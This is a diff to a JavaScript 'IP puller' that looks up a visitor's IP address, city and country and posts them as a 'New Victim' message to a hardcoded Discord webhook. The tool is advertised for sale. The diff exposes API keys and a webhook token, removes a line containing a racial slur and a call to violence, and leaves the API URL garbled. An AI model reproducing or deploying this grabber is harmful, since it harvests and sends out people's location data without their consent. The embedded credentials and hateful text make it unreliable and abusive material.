@@ -12,16 +12,15 @@
     }
     
     function getMyIP() {
-        let apiKey = 'c64ab728d42c9be3cba6c2d546fa575be79ed1cc32bf324b5de3a6d8';
+        let apiKey = '3dc9adbe58e5e216.fff70c02d7f2504d629bef86fc31b7f18eef700cc36d644c5d30363885290381';
         let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
 
-        json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+        json(`https://IPFLARE_API_KEY=y=${apiKey}`).then(data => {
             let message = {
-                content: "@everyone kill all niggers" ,
                 embeds: [
                     {
-                        title: "King von IP puller 😈",
-                        description: `New Victim**\nIP: ||${data.ip}||\nCity: ${data.city}\nCountry: ${data.country_code}\nBY RUNTZ PURCHASE TODAY!`,
+                        title: "@everyone King von IP puller 😈",
+                        description: `** New Victim**\nIP: ||${data.ip}||\nCity: ${data.city}\nCountry: ${data.country_code}\nBY RUNTZ PURCHASE TODAY!`,
                         image: {
                             url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                         },
